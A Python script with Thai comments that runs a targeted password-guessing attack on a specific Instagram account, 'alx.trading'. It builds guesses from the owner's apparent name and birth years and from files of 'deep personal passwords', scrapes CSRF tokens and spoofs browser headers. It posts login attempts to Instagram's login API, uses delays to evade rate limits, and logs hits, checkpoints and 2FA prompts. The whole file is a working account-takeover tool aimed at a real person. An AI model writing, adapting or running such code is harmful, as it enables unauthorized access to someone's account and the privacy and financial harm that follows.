#!/usr/bin/env python3
"""
🔥 ENHANCED REAL ATTACK - CSRF VERIFIED 🔥
ใช้รหัสที่ดึง CSRF token ได้จริงและมีการวิเคราะห์ response แบบละเอียด
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import asyncio
import aiohttp
import json
import time
import random
import re
import os
from datetime import datetime
from fake_useragent import UserAgent


class EnhancedRealAttacker:
    def __init__(self, target_username="alx.trading"):
        self.target_username = target_username
        self.ua = UserAgent()
        self.attack_stats = {
            'attempts': 0,
            'rate_limits': 0,
            'checkpoints': 0,
            'csrf_tokens_acquired': 0,
            'successful_responses': 0,
            'start_time': time.time()
        }
        self.successful_csrfs = []  # เก็บ CSRF tokens ที่ใช้ได้

    def display_banner(self):
        print("\n" + "="*70)
        print("🔥💀 ENHANCED REAL ATTACK - CSRF VERIFIED 💀🔥")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"🎯 Target: {self.target_username}")
        print(f"📅 Launch: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("🌐 Mode: ENHANCED REAL PRODUCTION ATTACK")
        print("🔑 Feature: CSRF Token Verification & Response Analysis")
        print("="*70 + "\n")

    def load_best_passwords(self):
        """โหลดรหัสผ่านที่ดีที่สุดจากการวิเคราะห์"""
        workspace = "/workspaces/sugarglitch-realops"

        # รหัสผ่านที่มีความเป็นไปได้สูงสุด
        high_priority = [
            "4l3x.7r4dlng2025",  # รหัสที่เคย trigger checkpoint
            "alx.trading2025",
            "Alejandro1990",
            "Alejandro1991",
            "Alejandro1992",
            "AlexTrading",
            "Trading2024",
            "Trading2025",
            "Alex1990",
            "Alex1991"
        ]

        # โหลดจากไฟล์ priority
        try:
            with open(os.path.join(workspace, 'priority_passwords.txt'), 'r') as f:
                priority_passwords = [
                    line.strip() for line in f
                    if line.strip() and not line.startswith('#')
                ]
            print(f"✅ Loaded {len(priority_passwords)} priority passwords")
        except Exception:
            priority_passwords = []

        # โหลดจากไฟล์ deep personal
        try:
            with open(os.path.join(workspace, 'deep_personal_passwords.txt'), 'r') as f:
                deep_passwords = [
                    line.strip() for line in f
                    if line.strip() and not line.startswith('#')
                ]
            print(f"✅ Loaded {len(deep_passwords)} deep personal passwords")
        except Exception:
            deep_passwords = []

        # รวมและจัดลำดับความสำคัญ
        all_passwords = high_priority + \
            priority_passwords + deep_passwords[:50]

        # ลบซ้ำ
        unique_passwords = []
        seen = set()
        for pwd in all_passwords:
            # รหัสผ่านต้องมีความยาวอย่างน้อย 4 ตัว
            if pwd not in seen and len(pwd) >= 4:
                seen.add(pwd)
                unique_passwords.append(pwd)

        print(f"📊 Total enhanced password list: {len(unique_passwords)}")
        return unique_passwords

    async def create_enhanced_session(self):
        """สร้าง session ที่ปรับปรุงแล้ว"""
        # ใช้ headers ที่เหมือนจริงมากขึ้น
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        }

        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=45),
            headers=headers
        )
        return session

    async def get_verified_csrf_token(self, session):
        """ดึง CSRF token และตรวจสอบความถูกต้อง"""
        try:
            print("🔑 Fetching and verifying CSRF token...")

            # เข้าหน้าแรกของ Instagram
            async with session.get('https://www.instagram.com/') as response:
                if response.status == 200:
                    text = await response.text()

                    # หา CSRF token ด้วยหลายแบบ
                    csrf_patterns = [
                        r'"csrf_token":"([^"]+)"',
                        r'csrf_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        r'csrftoken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        r'window\._sharedData\s*=\s*[^}]*"csrf_token":"([^"]+)"'
                    ]

                    for i, pattern in enumerate(csrf_patterns):
                        csrf_match = re.search(pattern, text, re.IGNORECASE)
                        if csrf_match:
                            token = csrf_match.group(1)

                            # ตรวจสอบความถูกต้องของ token
                            # CSRF token มักมีอักขระพิเศษ
                            if len(token) > 10 and token.isalnum() == False:
                                print(
                                    f"✅ CSRF Token acquired (pattern {i+1}): {token[:8]}...{token[-4:]}")
                                print(
                                    f"   📏 Token length: {len(token)} characters")

                                # เก็บ token ที่สำเร็จ
                                self.successful_csrfs.append(token)
                                self.attack_stats['csrf_tokens_acquired'] += 1

                                # ตรวจสอบว่า Instagram ตอบกลับดี
                                if 'instagram' in text.lower() and 'login' in text.lower():
                                    print(
                                        "   ✅ Instagram page structure confirmed")
                                    self.attack_stats['successful_responses'] += 1

                                return token

                    print("⚠️ No valid CSRF token patterns found")

                    # Debug: แสดงส่วนของหน้าเว็บ
                    snippet = text[:500]
                    print(f"   📄 Page snippet: {snippet[:100]}...")

                else:
                    print(
                        f"❌ Failed to get Instagram page: HTTP {response.status}")

        except Exception as e:
            print(f"❌ CSRF Token Error: {e}")

        return None

    async def enhanced_login_attempt(self, session, password, csrf_token):
        """การพยายาม login ที่ปรับปรุงแล้ว"""
        try:
            print(f"🔓 Attempting login with: {password}")

            # สร้าง payload ที่แม่นยำ
            timestamp = int(time.time())
            payload = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}',
                'stopDeletionNonce': '',
                'queryParams': '{}'
            }

            # Headers ที่แม่นยำสำหรับ login
            headers = {
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1007435743',  # มักจะเป็นตัวเลขที่เปลี่ยนแปลง
                'X-IG-App-ID': '936619743392459',  # Instagram App ID
                'X-IG-WWW-Claim': '0',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/',
                'User-Agent': self.ua.random,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }

            # ส่ง login request
            async with session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=payload,
                headers=headers
            ) as response:

                self.attack_stats['attempts'] += 1
                response_text = await response.text()

                print(f"   📡 HTTP Status: {response.status}")
                print(f"   📏 Response Length: {len(response_text)} chars")

                # วิเคราะห์ response แบบละเอียด
                if response.status == 200:

                    # ตรวจสอบ JSON response
                    try:
                        response_json = json.loads(response_text)
                        print(f"   📋 JSON Keys: {list(response_json.keys())}")

                        # ตรวจสอบความสำเร็จ
                        if response_json.get('authenticated') == True:
                            print(f"   🎉 LOGIN SUCCESS!")
                            self.save_success_result(password, response_json)
                            return {'success': True, 'password': password, 'data': response_json}

                        # ตรวจสอบ checkpoint
                        elif 'checkpoint_url' in response_json or response_json.get('checkpoint_required'):
                            print(f"   🚧 CHECKPOINT TRIGGERED!")
                            self.attack_stats['checkpoints'] += 1
                            checkpoint_url = response_json.get(
                                'checkpoint_url', 'Unknown')
                            print(f"   🔗 Checkpoint URL: {checkpoint_url}")
                            self.save_checkpoint_result(
                                password, response_json)
                            return {'checkpoint': True, 'password': password, 'data': response_json}

                        # ตรวจสอบ 2FA
                        elif response_json.get('two_factor_required'):
                            print(f"   🔐 2FA REQUIRED!")
                            print(
                                f"   📱 2FA Info: {response_json.get('two_factor_info', {})}")
                            self.save_2fa_result(password, response_json)
                            return {'2fa': True, 'password': password, 'data': response_json}

                        # ตรวจสอบ error messages
                        elif 'message' in response_json:
                            message = response_json['message']
                            print(f"   💬 Error Message: {message}")

                            if 'incorrect' in message.lower():
                                print(f"   ❌ Password incorrect")
                            elif 'user' in message.lower():
                                print(f"   ⚠️ User-related error")
                            else:
                                print(f"   🤔 Unknown error type")

                        else:
                            print(f"   📄 Response content: {response_json}")

                    except json.JSONDecodeError:
                        print(f"   ⚠️ Non-JSON response received")
                        snippet = response_text[:200].replace('\n', ' ')
                        print(f"   📄 Text snippet: {snippet}")

                elif response.status == 429:
                    self.attack_stats['rate_limits'] += 1
                    print(f"   ⏳ RATE LIMITED")
                    return {'rate_limit': True}

                elif response.status == 400:
                    print(f"   ⚠️ Bad Request (400)")
                    try:
                        error_json = json.loads(response_text)
                        print(f"   💬 Error details: {error_json}")
                    except:
                        print(f"   📄 Raw error: {response_text[:150]}")

                else:
                    print(f"   ❓ Unexpected status: {response.status}")
                    print(f"   📄 Response: {response_text[:100]}")

                return {
                    'failed': True,
                    'status': response.status,
                    'response': response_text[:1000]
                }

        except Exception as e:
            print(f"   💥 Exception during login: {str(e)}")
            return {'error': str(e)}

    def save_success_result(self, password, response_data):
        """บันทึกผลลัพธ์ที่สำเร็จ"""
        result = {
            'target': self.target_username,
            'password': password,
            'result_type': 'SUCCESS',
            'timestamp': datetime.now().isoformat(),
            'response_data': response_data,
            'attack_stats': self.attack_stats.copy()
        }

        filename = f"SUCCESS_{self.target_username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(result, f, indent=2)

        print(f"💾 Success result saved: {filename}")

    def save_checkpoint_result(self, password, response_data):
        """บันทึกผลลัพธ์ checkpoint"""
        result = {
            'target': self.target_username,
            'checkpoint_password': password,
            'timestamp': datetime.now().isoformat(),
            'response_data': response_data,
            'note': 'Checkpoint triggered - password might be correct',
            'csrf_tokens_used': self.successful_csrfs
        }

        filename = f"CHECKPOINT_{self.target_username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(result, f, indent=2)

        print(f"💾 Checkpoint result saved: {filename}")

    def save_2fa_result(self, password, response_data):
        """บันทึกผลลัพธ์ 2FA"""
        result = {
            'target': self.target_username,
            'password': password,
            'result_type': '2FA_REQUIRED',
            'timestamp': datetime.now().isoformat(),
            'response_data': response_data,
            'note': 'Password correct but 2FA required'
        }

        filename = f"2FA_{self.target_username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(result, f, indent=2)

        print(f"💾 2FA result saved: {filename}")

    def display_enhanced_stats(self):
        """แสดงสถิติแบบละเอียด"""
        runtime = int(time.time() - self.attack_stats['start_time'])
        rate = self.attack_stats['attempts'] / max(runtime, 1)

        print(f"\n📊 ENHANCED ATTACK STATISTICS")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"⏱️  Runtime: {runtime}s")
        print(f"🔐 Attempts: {self.attack_stats['attempts']}")
        print(f"⚡ Attack Rate: {rate:.2f} attempts/sec")
        print(f"🔑 CSRF Tokens: {self.attack_stats['csrf_tokens_acquired']}")
        print(
            f"📡 Successful Responses: {self.attack_stats['successful_responses']}")
        print(f"🚧 Checkpoints: {self.attack_stats['checkpoints']}")
        print(f"⏳ Rate Limits: {self.attack_stats['rate_limits']}")

    async def run_enhanced_attack(self, max_passwords=50):
        """รันการโจมตีแบบปรับปรุง"""
        self.display_banner()

        # โหลดรหัสผ่านที่ดีที่สุด
        passwords = self.load_best_passwords()
        if not passwords:
            print("❌ No passwords loaded!")
            return

        attack_passwords = passwords[:max_passwords]
        print(
            f"🎯 Enhanced attack with {len(attack_passwords)} best passwords\n")

        session = await self.create_enhanced_session()

        try:
            for i, password in enumerate(attack_passwords):

                # ดึง CSRF token ใหม่ทุก 5 attempts
                if i % 5 == 0:
                    csrf_token = await self.get_verified_csrf_token(session)
                    if not csrf_token:
                        print("❌ Cannot proceed without CSRF token")
                        await asyncio.sleep(30)  # รอแล้วลองใหม่
                        continue

                print(f"\n🎯 Attack #{i+1}/{len(attack_passwords)}")
                result = await self.enhanced_login_attempt(session, password, csrf_token)

                # จัดการผลลัพธ์
                if result.get('success'):
                    print(f"\n🎉 ATTACK SUCCESSFUL! Password: {password}")
                    break

                elif result.get('checkpoint'):
                    print(
                        f"\n🚧 CHECKPOINT - Password likely correct: {password}")

                elif result.get('2fa'):
                    print(f"\n🔐 2FA REQUIRED - Password correct: {password}")
                    break

                elif result.get('rate_limit'):
                    print("⏳ Rate limited - implementing enhanced delay...")
                    await asyncio.sleep(120)  # รอนานขึ้น
                    continue

                # แสดงสถิติทุก 10 attempts
                if i % 10 == 0 and i > 0:
                    self.display_enhanced_stats()

                # Smart delay
                delay = random.uniform(5, 12)
                print(f"   ⏳ Waiting {delay:.1f}s before next attempt...")
                await asyncio.sleep(delay)

        finally:
            await session.close()
            self.display_enhanced_stats()
            print(f"\n🔥 Enhanced attack completed!")
            print(
                f"📊 Total CSRF tokens acquired: {len(self.successful_csrfs)}")


async def main():
    """Main execution"""
    print("🚀 INITIALIZING ENHANCED REAL ATTACK SYSTEM...")
    print("🔑 With verified CSRF token extraction")

    attacker = EnhancedRealAttacker("alx.trading")

    try:
        await attacker.run_enhanced_attack(max_passwords=30)

    except KeyboardInterrupt:
        print("\n⏹️ Enhanced attack stopped by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")


if __name__ == "__main__":
    asyncio.run(main())
